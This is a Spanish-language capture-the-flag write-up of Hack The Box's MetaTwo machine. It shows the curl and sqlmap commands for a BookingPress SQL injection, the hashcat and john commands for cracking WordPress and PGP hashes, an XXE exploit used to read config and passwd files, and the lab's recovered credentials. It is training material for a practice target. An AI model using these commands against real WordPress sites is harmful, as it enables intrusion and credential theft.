---
title:  "Writeup de la máquina MetaTwo de Hack The Box"
date: 2022-11-25
mathjax: true
layout: post
categories: writeup
tags: CVE wordpress sql-injection burpsuite sqlmap hashcat john ftp pgp
---

# Resolución de la máquina MetaTwo de la plataforma de HackTheBox

![](https://i.ibb.co/LnFdRp8/metatwo.png)

### 🚀 *"La clave de esta máquina está en buscar las vulnerabilidades de Wordpress"*

**Primero realizaremos un escaneo rápido de la máquina sólo en búsqueda de puertos abiertos con la herramienta "Nmap"**

```bash
sudo nmap 10.10.11.186 -vvv -Pn -p- --min-rate 5000 --open -sS -oG
```
    
Con el comando anterior exportamos el resultado en un formato en el cual podamos extraer los puertos abiertos con la ayuda de el comando *"grep"* y luego escanear en profundidad con el siguiente comando:

```bash
sudo nmap 10.10.11.186 -p21,22,80 -sVC -Pn -vvv -oN
```

#### Ahora con el escaneo completo obtenemos el siguiente resultado:

![](https://i.ibb.co/VV86YBj/nmap-scan-Complete.png)

**Vemos que está abierto el puerto 80 ejecutando el servicio http y además vemos el DNS de "metapress.htb", por lo que vamos a revisar la página.**

#####  Para esto es recomendable agregar el DNS "metapress.htb" con la IP de la máquina, en el archivo /etc/hosts para no tener que escribir la IP cada vez:
Añadimos la siguiente línea en el final de /etc/hosts

```
10.10.11.186	metapress.htb	# Máquina MetaTwo
```

![](https://i.ibb.co/rZrM2yb/metapress-htb.png)

#### Con la extensión de Wappalyzer vemos que se está ejecutando Wordpress, por lo que podríamos buscar vulnerabilidades con la herramienta "Wpscan"

![](https://i.ibb.co/JnL9C16/wappalyzer-wordpress.png)

```bash
wpscan --url http://metapress.htb --plugins-detection mixed -e ap,at -t 450 --api-token {TU API TOKEN}
```

**Luego de que la herramienta haya finalizado con el escaneo, encontramos una vulnerabilidad para explotar:**


> [!] 1 vulnerability identified:  
> [!] Title: BookingPress < 1.0.11
>  Unauthenticated SQL Injection  
> - Fixed in: 1.0.11  
> - References: https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 
> - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739 
> - https://plugins.trac.wordpress.org/changeset/2684789


 **En base a esto procedemos a ejecutar el exploit de la vulnerabilidad:**
 
#### Primero creamos un evento dentro de la página de metapress.htb/events. Lo cual significa que hicimos ya, la primera parte del exploit.

#### Luego buscamos el código "nonce" en el código fuente HTML de la página de creación eventos: "http://metapress.htb/events/". El código ***"nonce"*** es en mi caso "f5c16a06dd". Ya lo tenemos! Así que procedemos:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f5c16a06dd&category_id=1&total_service=1'
```

Salida en consola:

```
HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 25 Nov 2022 16:41:51
GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked
Connection: keep-alive X-Powered-By: PHP/8.0.24 X-Robots-Tag: noindex
X-Content-Type-Options: nosniff Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0 X-Frame-Options:
SAMEORIGIN Referrer-Policy: strict-origin-when-cross-origin

[{"bookingpress_service_id":"1","bookingpress_category_id":"1","bookingpress_service_name":"Startup meeting","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":"30","bookingpress_service_duration_unit":"m","bookingpress_service_description":"Join us, we will celebrate our startup!","bookingpress_service_position":"0","bookingpress_servicedate_created":"2022-06-23","18:02:38","service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

Como vemos en consola, el sitio es vulnerable a *SQL Injection*, por lo que pasamos a usar la herramienta **"SQLmap"**. Pero para esto necesitamos el archivo **req.txt** que lo conseguiremos usando la herramienta **Burp Suite** de tal forma que dirigimos la petición POST con el comando "curl" añadiéndole el parámetro "--proxy" para capturar el tráfico. 

## Esto funciona de la siguiente manera:

#### Envíamos la misma petición POST con "curl" pero dirigimos el tráfico por nuestro proxy hacia nuestro host local (localhost) en el puerto 8080 con el comando: 

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f5c16a06dd&category_id=1&total_service=1' --proxy 127.0.0.1:8080
```

#### Luego de ser capturado por Burp Suite, copiamos el Request al archivo "req.txt" (o cualquier nombre, usar "req.txt" es buena práctica para recordar qué archivo es):

![](https://i.ibb.co/8Bpgjvr/burpsuite-copy-to-file.png)

## Y ahora sí vamos con SQLmap:

**Luego de lanzar varios comandos, descubrimos una base de datos llamada "blog" con una tabla "wp_users" así que la enumeramos con el siguiente comando:**  

Esto utilizará códigos de SQL Injection a fuerza bruta con el diccionario por defecto de SQLmap:

```bash
sqlmap -r req.txt -p "total_service"  --threads 9 --batch -D blog -T wp_users --dump
```

#### Resulta que tenemos suerte, y logramos obtener lo siguiente:
user_login: `admin`
user_pass: `$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`

user_login: `manager`
user_pass: `$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`

**Con estos hashes de contraseñas de los usuarios "admin" y "manager", podemos identificar qué tipo de hash son, con la utilidad "hash-identifier"**

> Possible Hashs: [+] MD5(Wordpress)

#### En éste momento procedemos a crackear el hash del usuario "manager" con Hashcat


### Utilizaremos el diccionario "rockyou.txt" que es el predeterminado en las máquinas de CTF:

```bash
hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt -o password_of_manager_user -O
```

- Donde "hash.txt" es el hash que descubrimos con SQLmap del usuario manager, es decir: 
`$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`. Y donde "400" es el código de hashcat para **MD5(Wordpress)**.

- El resultado luego de esperar a que Hashcat haga su trabajo es el siguiente:
- password: **partylikearockstar**

### Ahora podemos iniciar sesión en el portal de Login de Wordpress en http://metapress.htb/wp-login.php

- Usuario: manager
- Contraseña: partylikearockstar

 Dentro del panel del usuario nos encontramos que podemos subir contenido. Para esto, si examinamos los resultados de **Wpscan** que conseguimos anteriormente, hay una vulnerabilidad **XXE** que podemos explotar. 

> [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media | Library Affecting PHP 8  
> - Fixed in: 5.6.3     
> - References:  https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 
> - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447   
> - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
> - https://core.trac.wordpress.org/changeset/29378 
> - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
> - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
> - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
> - https://hackerone.com/reports/1095645
> - https://www.youtube.com/watch?v=3NBxcmqCgt4

#### Confirmamos con Wappalyzer anteriormente que el sitio utiliza PHP versión 8, por lo que es vulnerable.

#### Si buscamos en internet hay muchos exploits para utilizar, en mi caso voy a usar uno que encontré en Github: https://github.com/motikan2010/CVE-2021-29447

Una vez explotada la vulnerabilidad, encontramos: 
- Las credenciales para conectarnos al servidor **FTP** en el archivo ***"wp-config.php"***

> define( 'FS_METHOD', 'ftpext' ); 

> define( 'FTP_USER', 'metapress.htb'); 

> define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' ); 

> define( 'FTP_HOST', 'ftp.metapress.htb' ); define( 'FTP_BASE', 'blog/' );

> define( 'FTP_SSL', false );

- El usuario **"jnelson"** en /etc/passwd con acceso a una bash shell. 

![](https://i.ibb.co/NWM3gLp/etc-passwd.png)

####  Con esto procedemos a conectarnos al servicio FTP con las credenciales obtenidas

```bash
ftp metapress.htb@10.10.11.186 #contraseña: 9NYS_ii@FyL_p5M2NvJ
```

Podemos ver en la carpeta **"mailer"** el archivo **send_email.php** que contiene las credenciales del email del usuario **"jnelson"**:

> $mail->Username = "jnelson@metapress.htb";                 
> $mail->Password = "Cb4_JmWM8zUZWMu@Ys";

## Let's go! Nos conectamos por SSH

Afortunadamente la contraseña del *mail* de **jnelson** es la misma que en la conexión *ssh*, por lo que logramos obtener una conexión y luego es hora de escalar privilegios:

```bash
ssh jnelson@10.10.11.186 # contraseña: Cb4_JmWM8zUZWMu@Ys
```

- Obtenemos la flag de user en el directorio /home/jnelson
- Luego de revisar todos los archivos visibles y ocultos, nos encontramos enseguida con una clave PGP y un mensaje PGP en los archivos: 

  - /home/jnelson/.passpie/.keys
  - /home/jnelson/.passpie/.ssh/root.pass

#### Ahora copiamos la clave privada PGP, el mensaje y las guardamos

- Primero necesitamos la contraseña de la Clave PGP Privada, así que usaremos la herramienta gpg2john para luego crackearla.

```bash
gpg2john pgp-private-key.txt > output.txt
```

Con esto obtendremos el hash listo para crackearlo con **John**. El comando es el siguiente:

```bash
john output.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Si, el clásico "rockyou.txt" siempre sirve con los CTF.

* Obtendremos la contraseña: **"blink182"**


## Parte final ...

#### Ahora viene lo divertido: escalar privilegios.
Tenemos el mensaje encriptado, la Clave PGP y la contraseña para desencriptar el mensaje. Solamente nos hace falta un software para realizar esta tarea.

### En mi caso utilicé la herramienta PGP-Tool, disponible en: [https://pgptool.github.io/](https://pgptool.github.io/){:target="_blank"}

 Este software es Gratiuito y de Código Abierto, disponible en Windows, Linux y Mac OS. El repositorio de Github es el siguiente: [https://github.com/pgptool/pgptool](https://github.com/pgptool/pgptool){:target="_blank"}

#### Como no me funcionó en Linux, quizás sea por mi versión de Java, lo hice en Windows 10 y finalmente, obtenemos la contraseña del usuario root:

![](https://i.ibb.co/9NYMH1J/pgp-tool.png)

```
p7qfAZt4_A1xo_0x
```

 Ahora es cuestión de ejecutar:

```bash
su root
```

* Contraseña: "p7qfAZt4_A1xo_0x"


#### Obtenemos la flag de root y terminamos la máquina.
Happy Hacking!!

----

## Author: Mateo Fumis 
